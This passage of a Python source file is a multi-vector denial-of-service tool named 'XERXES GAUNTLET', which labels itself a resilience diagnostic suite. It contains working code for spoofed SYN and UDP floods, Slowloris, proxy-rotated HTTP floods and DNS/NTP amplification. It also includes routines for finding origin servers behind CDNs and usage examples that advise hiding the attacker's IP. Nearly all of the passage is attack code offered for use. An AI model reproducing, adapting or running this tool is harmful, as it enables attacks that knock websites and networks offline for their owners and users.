                    struct.pack('!HHLLBBHHH', random_port(), self.target_port, random.randint(0,0xFFFFFFFF), 0,
                        0x50, 0x02, 0xFFFF, 0, 0))
                try:
                    sock.sendto(packet, (self.target_ip, 0))
                    with stats["lock"]:
                        stats["packets_sent"] += 1; stats["bytes_sent"] += len(packet)
                except:
                    with stats["lock"]: stats["errors"] += 1
                time.sleep(random.uniform(0.0001, 0.002))
        except PermissionError:
            logger.error("[SYN-Q] Permission denied. Need admin/root.")
            stats["running"] = False
        except Exception as e:
            logger.error(f"[SYN-Q] {e}")
        finally:
            if 'sock' in locals(): sock.close()

    def start(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()


class OmnipotentUDPFlood:
    def __init__(self, target_ip: str, target_port: int, packet_size: int = 1500,
                 threads: int = 10):
        self.target_ip = target_ip; self.target_port = target_port
        self.packet_size = min(packet_size, 65507); self.thread_count = threads

    def _worker(self, worker_id: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            logger.info(f"[UDP-B] Worker {worker_id} started")
            while stats["running"]:
                src_ip = random_ip(); src_port = random_port()
                payload_size = self.packet_size - 28
                payload = os.urandom(payload_size) if hasattr(os, 'urandom') else \
                    bytes([random.randint(0,255) for _ in range(payload_size)])
                udp_hdr = struct.pack('!HHHH', src_port, self.target_port, 8 + len(payload), 0)
                ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20+8+len(payload),
                    random.randint(0,65535), 0, 64, socket.IPPROTO_UDP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
                try:
                    sock.sendto(ip_hdr + udp_hdr + payload, (self.target_ip, 0))
                    with stats["lock"]:
                        stats["packets_sent"] += 1; stats["bytes_sent"] += len(ip_hdr) + len(udp_hdr) + len(payload)
                except:
                    with stats["lock"]: stats["errors"] += 1
        except PermissionError:
            logger.error("[UDP-B] Permission denied. Need admin/root.")
            stats["running"] = False
        except Exception as e:
            logger.error(f"[UDP-B] {e}")
        finally:
            if 'sock' in locals(): sock.close()

    def start(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()


class OmnipotentSlowloris:
    def __init__(self, target_host: str, target_port: int = 80, max_sockets: int = 500):
        self.target_host = target_host; self.target_port = target_port
        self.max_sockets = max_sockets; self.sockets = []

    def _create_socket(self) -> Optional[socket.socket]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_host, self.target_port))
            request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {self.target_host}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            # DON'T send final \r\n
            sock.send(request.encode())
            return sock
        except: return None

    def _worker(self):
        while stats["running"]:
            while len(self.sockets) < self.max_sockets and stats["running"]:
                sock = self._create_socket()
                if sock:
                    self.sockets.append(sock)
                    with stats["lock"]: stats["connections_opened"] += 1
                time.sleep(0.05)
            dead = []
            for sock in self.sockets:
                if not stats["running"]: break
                try:
                    ka = f"X-Keep: {random.randint(0,999999)}\r\n"
                    sock.send(ka.encode())
                    with stats["lock"]:
                        stats["packets_sent"] += 1; stats["bytes_sent"] += len(ka)
                except: dead.append(sock)
            for s in dead:
                try: s.close()
                except: pass
                if s in self.sockets: self.sockets.remove(s)
            time.sleep(random.uniform(5, 15))

    def start(self):
        t = threading.Thread(target=self._worker, daemon=True)
        t.start()


class ChronitonScheduler:
    """Exploit firewall reload windows"""
    def __init__(self):
        self.reload_schedule = [0, 15, 30, 45]
        self.reload_duration = 10

    def is_in_reload_window(self) -> bool:
        now = datetime.now()
        minute = now.minute; second = now.second
        for m in self.reload_schedule:
            if minute == m and second < self.reload_duration: return True
        return False

    def next_reload_window(self) -> float:
        now = datetime.now()
        current_min = now.minute
        for m in self.reload_schedule:
            if m > current_min: return (m - current_min) * 60 - now.second
        return (60 - current_min + self.reload_schedule[0]) * 60 - now.second


class RealityShiftDaemon:
    """Monitor all vectors, shift to most effective"""
    def __init__(self):
        self.vectors = []
        self.active_vector_name = None
        self.lock = threading.Lock()

    def register_vector(self, name: str, engine: Any):
        self.vectors.append({'name': name, 'engine': engine, 'success_rate': 1.0, 'pps': 0, 'errors': 0})
        logger.info(f"[RSD] Registered: {name}")

    def update_vector_stats(self, name: str, pps: int, errors: int):
        for v in self.vectors:
            if v['name'] == name:
                v['pps'] = pps; v['errors'] = errors
                if pps > 0: v['success_rate'] = 1.0 - (errors / (pps + errors + 1))

    def select_best_vector(self):
        if not self.vectors: return None
        return max(self.vectors, key=lambda v: v['success_rate'])['name']

    def shift_to_best(self):
        best_name = self.select_best_vector()
        if best_name and best_name != self.active_vector_name:
            with self.lock:
                logger.info(f"[RSD] Shift: {self.active_vector_name} -> {best_name}")
                self.active_vector_name = best_name
                stats["reality_shifts"] += 1
        return self.active_vector_name


# ========================================================================
#  ORIGIN IP DISCOVERY
# ========================================================================

class OriginDiscovery:
    """Find real origin IP behind CDN/WAF"""
    @staticmethod
    def find_origin(domain: str) -> List[str]:
        candidates = []
        # Method 1: Direct DNS A record
        try:
            candidates.append(socket.gethostbyname(domain))
        except: pass

        # Method 2: Historical DNS (simulated — real would use SecurityTrails/Censys API)
        try:
            # Check common subdomains that might bypass CDN
            for sub in ["direct", "origin", "cdn", "admin", "mail", "ftp", "ssh", "dev", "stage"]:
                try:
                    ip = socket.gethostbyname(f"{sub}.{domain}")
                    if ip not in candidates:
                        candidates.append(ip)
                except: pass
        except: pass

        # Method 3: MX record → mail server IP
        try:
            import dns.resolver  # optional
            for mx in dns.resolver.resolve(domain, 'MX'):
                try:
                    ip = socket.gethostbyname(str(mx.exchange).rstrip('.'))
                    if ip not in candidates: candidates.append(ip)
                except: pass
        except ImportError: pass
        except: pass

        return candidates

    @staticmethod
    def scan_origin(target_ip: str, ports: List[int] = None) -> List[int]:
        """Quick port scan on origin IP"""
        if ports is None:
            ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]
        open_ports = []
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    open_ports.append(port)
                s.close()
            except: pass
        return open_ports


# ========================================================================
#  MULTI-VECTOR ORCHESTRATOR
# ========================================================================

class GauntletMultiVector:
    """Launch ALL vectors with Reality Shift monitoring"""

    def __init__(self, config: Dict):
        self.config = config
        self.rsd = RealityShiftDaemon()
        self.rotator = None
        self.engines = {}

    def start(self):
        target_ip = self.config.get("target_ip", "192.168.1.1")
        target_port = self.config.get("target_port", 80)
        target_url = self.config.get("target_url", f"http://{target_ip}:{target_port}")
        enable_proxy = self.config.get("enable_proxy", True)
        enable_amp = self.config.get("enable_amplification", False)
        enable_syn = self.config.get("enable_syn", False)
        enable_udp = self.config.get("enable_udp", False)

        logger.info("=" * 60)
        logger.info("  XERXES GAUNTLET v6.0 — ALL VECTORS")
        logger.info(f"  Target: {target_url} ({target_ip}:{target_port})")
        logger.info(f"  Proxy : {'ENABLED' if enable_proxy else 'DISABLED'}")
        logger.info(f"  Amplif: {'ENABLED' if enable_amp else 'DISABLED'}")
        logger.info("=" * 60)

        # 1. PROXY HTTP FLOOD — MAIN WEAPON
        if enable_proxy:
            fetcher = ProxyFetcher()
            logger.info("[OMNI] Fetching proxies from Supabase...")
            initial = fetcher.fetch_and_validate(
                limit=self.config.get("proxy_limit", 300),
                min_quality=self.config.get("proxy_min_quality", 60),
                max_proxies=self.config.get("proxy_max", 150),
                validate=self.config.get("proxy_validate", True)
            )
            self.rotator = ProxyRotator(fetcher)
            self.rotator.init_pool(initial)

            if self.rotator.alive_count() > 0:
                force_proxy = self.config.get("force_proxy", False)
                http = ProxyHTTPFlood(
                    target_url,
                    self.rotator,
                    method=self.config.get("http_method", "GET"),
                    concurrent=self.config.get("http_concurrent", 500),
                    duration=self.config.get("duration", 60),
                    random_paths=self.config.get("random_paths", True),
                    cache_bust=self.config.get("cache_bust", True),
                    force_proxy=force_proxy,
                )
                http.start()
                self.engines["HTTP-P"] = http
                self.rsd.register_vector("HTTP-P", http)
                logger.info(f"[OMNI] HTTP-P started with {self.rotator.alive_count()} proxies")
            else:
                logger.warning("[OMNI] No alive proxies. HTTP-P disabled.")

        # 2. SYN FLOOD (admin/root only)
        if enable_syn:
            syn = OmnipotentSYNFlood(target_ip, target_port,
                                     threads=self.config.get("syn_threads", 10))
            syn.start()
            self.engines["SYN-Q"] = syn
            self.rsd.register_vector("SYN-Q", syn)

        # 3. UDP FLOOD (admin/root only)
        if enable_udp:
            udp = OmnipotentUDPFlood(target_ip, target_port,
                                     packet_size=self.config.get("udp_size", 1500),
                                     threads=self.config.get("udp_threads", 10))
            udp.start()
            self.engines["UDP-B"] = udp
            self.rsd.register_vector("UDP-B", udp)

        # 4. AMPLIFICATION
        if enable_amp:
            if self.config.get("amp_dns", True):
                dns = DNSAmplifier(target_ip, threads=self.config.get("amp_threads", 50))
                dns.start()
                self.engines["AMP-DNS"] = dns
                self.rsd.register_vector("AMP-DNS", dns)
            if self.config.get("amp_ntp", True):
                ntp = NTPAmplifier(target_ip, threads=self.config.get("amp_threads", 30))
                ntp.start()
                self.engines["AMP-NTP"] = ntp
                self.rsd.register_vector("AMP-NTP", ntp)

        # 5. SLOWLORIS
        slow = OmnipotentSlowloris(target_ip, target_port,
                                   max_sockets=self.config.get("slow_sockets", 200))
        slow.start()
        self.engines["SLOW-B"] = slow
        self.rsd.register_vector("SLOW-B", slow)

        self.rsd.shift_to_best()
        logger.info(f"[OMNI] {len(self.engines)} vectors active. RSD monitoring...")


# ========================================================================
#  STATS MONITOR
# ========================================================================

def stats_monitor(interval: float = 3.0):
    last_packets = 0; last_bytes = 0; last_time = time.time()
    while stats["running"]:
        time.sleep(interval)
        if not stats["running"]: break
        now = time.time(); elapsed = now - last_time
        cur_packets = stats["packets_sent"]; cur_bytes = stats["bytes_sent"]
        pps = (cur_packets - last_packets) / elapsed if elapsed > 0 else 0
        bps = (cur_bytes - last_bytes) * 8 / elapsed if elapsed > 0 else 0
        req = stats["requests_done"]
        err = stats["errors"]
        logger.info(
            f"[STATS] PPS: {pps:,.0f} | BW: {bps/1e6:.2f} Mbps | "
            f"Req: {req:,} | Err: {err:,} | "
            f"Pkt: {cur_packets:,} | Conn: {stats['connections_opened']:,}"
        )
        if stats.get('amplification_factor', 0) > 1:
            logger.info(f"[STATS]   Amplification: ~{stats['amplification_factor']}x")
        last_packets = cur_packets; last_bytes = cur_bytes; last_time = now


# ========================================================================
#  MAIN
# ========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="XERXES GAUNTLET v6.0 — Network Resilience Diagnostic Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  # PROXY HTTP FLOOD (main weapon — RECOMMENDED)
  python xerxes-omni.py -m http -u https://target.com --concurrent 1000 --duration 120

  # MULTI-VECTOR (proxy HTTP + slowloris + amplification)
  python xerxes-omni.py -m all -t 1.2.3.4 -p 80 -u https://target.com --duration 60

  # SYN FLOOD (raw socket — needs admin)
  python xerxes-omni.py -m syn -t 1.2.3.4 -p 80 --threads 20

  # AMPLIFICATION ONLY
  python xerxes-omni.py -m amp -t 1.2.3.4 --amp-dns --amp-ntp

  # FULL NUCLEAR (proxy + all amps + all floods)
  python xerxes-omni.py -m all -u https://target.com --with-amp --with-syn
        """)
    parser.add_argument("-t", "--target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-u", "--url", help="Target URL (required for HTTP mode)")
    parser.add_argument("-m", "--mode", choices=["syn", "udp", "http", "slowloris", "amp", "all"],
                       default="http", help="Attack mode (default: http)")
    parser.add_argument("--threads", type=int, default=10)
    parser.add_argument("--concurrent", type=int, default=500,
                       help="Concurrent HTTP workers through proxies")
    parser.add_argument("--duration", type=int, default=60, help="Test duration in seconds")
    parser.add_argument("--size", type=int, default=1500, help="UDP packet size")
    parser.add_argument("--sockets", type=int, default=200, help="Slowloris sockets")
    parser.add_argument("--http-method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--no-stats", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")

    # Proxy options
    parser.add_argument("--proxy-limit", type=int, default=300,
                       help="Max proxies to fetch from API")
    parser.add_argument("--proxy-min-quality", type=int, default=60,
                       help="Minimum proxy quality score (0-100)")
    parser.add_argument("--proxy-max", type=int, default=150,
                       help="Max proxies in active pool")
    parser.add_argument("--no-proxy-validate", action="store_true",
                       help="Skip proxy validation (faster startup)")
    parser.add_argument("--no-cache-bust", action="store_true")
    parser.add_argument("--no-random-paths", action="store_true")
    parser.add_argument("--force-proxy", action="store_true",
                       help="Only attack through proxies. NO direct fallback (safer, hides your IP)")

    # Amplification
    parser.add_argument("--with-amp", action="store_true", help="Enable amplification attacks")
    parser.add_argument("--amp-dns", action="store_true", help="DNS amplification")
    parser.add_argument("--amp-ntp", action="store_true", help="NTP amplification")
    parser.add_argument("--amp-threads", type=int, default=50)

    # Legacy raw socket
    parser.add_argument("--with-syn", action="store_true", help="Enable SYN flood (needs admin)")
    parser.add_argument("--with-udp", action="store_true", help="Enable UDP flood (needs admin)")

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Determine target
    target_ip = args.target
    if not target_ip and args.url:
        try:
            from urllib.parse import urlparse
            target_ip = socket.gethostbyname(urlparse(args.url).hostname)
            logger.info(f"[DNS] Resolved {urlparse(args.url).hostname} -> {target_ip}")
        except:
            logger.error("Could not resolve target. Use -t or -u with valid URL.")
            sys.exit(1)

    target_ip = target_ip or "127.0.0.1"
    target_url = args.url or f"http://{target_ip}:{args.port}"
    target_port = args.port

    stats["start_time"] = time.time()
    if not args.no_stats:
        threading.Thread(target=stats_monitor, daemon=True).start()

    # === SAFETY WARNINGS ===
    if args.mode in ("http", "all") and not args.force_proxy:
        logger.warning("!" * 55)
        logger.warning("!  YOUR IP WILL BE VISIBLE TO TARGET!")
        logger.warning("!  Direct fallback is ENABLED. When proxies die,")
        logger.warning("!  requests come from YOUR real IP address.")
        logger.warning("!")
        logger.warning("!  Use --force-proxy to stay anonymous")
        logger.warning("!  (but attack stops if proxy pool empties)")
        logger.warning("!" * 55)
        time.sleep(2)  # Give user time to read and Ctrl+C

    if args.mode in ("http", "all"):
        # Check for aiohttp
        if not HAS_AIOHTTP:
            logger.error("[!] aiohttp required for HTTP mode.")
            logger.error("    Install: pip install aiohttp aiohttp-socks")
            if args.mode == "http":
                sys.exit(1)

    try:
        if args.mode == "http":
            logger.info(f"[*] Proxy HTTP Flood mode — {args.concurrent} workers")
            fetcher = ProxyFetcher()
            initial = fetcher.fetch_and_validate(
                limit=args.proxy_limit,
                min_quality=args.proxy_min_quality,
                max_proxies=args.proxy_max,
                validate=not args.no_proxy_validate
            )
            if not initial:
                logger.error("[!] No proxies fetched. Check API key or connectivity.")
                # Fallback: spawn without proxies (direct HTTP)
                logger.warning("[!] Falling back to direct HTTP flood (no proxies)")
                rotator = ProxyRotator(fetcher)
                rotator.proxies = [Proxy("127.0.0.1", 0, "DIRECT", "Local", 0, 100)]
            else:
                fetcher2 = ProxyFetcher()
                rotator = ProxyRotator(fetcher2)
                rotator.init_pool(initial)

            http = ProxyHTTPFlood(
                target_url, rotator,
                method=args.http_method,
                concurrent=args.concurrent,
                duration=args.duration,
                random_paths=not args.no_random_paths,
                cache_bust=not args.no_cache_bust,
                force_proxy=args.force_proxy,
            )
            http.start()
            logger.info(f"\n[*] Attacking {target_url} with {args.concurrent} workers through proxies")
            logger.info(f"[*] Press Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

        elif args.mode == "all":
            config = {
                "target_ip": target_ip, "target_port": target_port, "target_url": target_url,
                "enable_proxy": True, "enable_amplification": args.with_amp,
                "enable_syn": args.with_syn, "enable_udp": args.with_udp,
                "http_concurrent": args.concurrent, "http_method": args.http_method,
                "duration": args.duration, "random_paths": not args.no_random_paths,
                "cache_bust": not args.no_cache_bust,
                "force_proxy": args.force_proxy,
                "proxy_limit": args.proxy_limit, "proxy_min_quality": args.proxy_min_quality,
                "proxy_max": args.proxy_max, "proxy_validate": not args.no_proxy_validate,
                "syn_threads": args.threads, "udp_threads": args.threads, "udp_size": args.size,
                "slow_sockets": args.sockets,
                "amp_dns": args.amp_dns or args.with_amp,
                "amp_ntp": args.amp_ntp or args.with_amp,
                "amp_threads": args.amp_threads,
            }
            engine = GauntletMultiVector(config)
            engine.start()
            logger.info(f"\n[*] Multi-vector attack running. Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

        elif args.mode == "amp":
            config = {
                "target_ip": target_ip,
                "amp_dns": args.amp_dns or True,
                "amp_ntp": args.amp_ntp or True,
                "amp_threads": args.amp_threads,
            }
            if config["amp_dns"]:
                dns = DNSAmplifier(target_ip, threads=config["amp_threads"])
                dns.start()
            if config["amp_ntp"]:
                ntp = NTPAmplifier(target_ip, threads=config["amp_threads"])
                ntp.start()
            logger.info(f"\n[*] Amplification attacks running. Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

        elif args.mode == "syn":
            engine = OmnipotentSYNFlood(target_ip, target_port, threads=args.threads)
            engine.start()
            logger.info(f"\n[*] SYN flood on {target_ip}:{target_port}. Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

        elif args.mode == "udp":
            engine = OmnipotentUDPFlood(target_ip, target_port, packet_size=args.size,
                                        threads=args.threads)
            engine.start()
            logger.info(f"\n[*] UDP flood on {target_ip}:{target_port}. Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

        elif args.mode == "slowloris":
            engine = OmnipotentSlowloris(target_ip, target_port, max_sockets=args.sockets)
            engine.start()
            logger.info(f"\n[*] Slowloris on {target_ip}:{target_port}. Ctrl+C to stop.\n")
            while stats["running"]:
                time.sleep(1)
                if time.time() - stats["start_time"] > args.duration:
                    stats["running"] = False

    except KeyboardInterrupt:
        logger.info("\n[!] Interrupted.")
    finally:
        stats["running"] = False
        print_stats_final()


if __name__ == "__main__":
    if os.name == 'posix' and os.geteuid() != 0:
        logger.warning("⚠ Not running as root. SYN/UDP/AMP spoofing needs raw sockets (sudo).")
    main()
